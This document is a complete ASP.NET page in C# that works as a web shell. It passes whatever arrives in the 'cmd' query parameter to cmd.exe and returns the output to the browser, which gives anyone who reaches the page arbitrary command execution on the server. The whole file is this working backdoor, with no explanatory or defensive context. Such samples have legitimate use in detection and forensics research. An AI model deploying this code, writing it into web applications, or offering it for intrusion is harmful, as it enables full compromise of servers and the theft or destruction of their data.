<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>
<%
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + Request.QueryString["cmd"];
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();

                Response.Write(ret);
            }
        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
%>
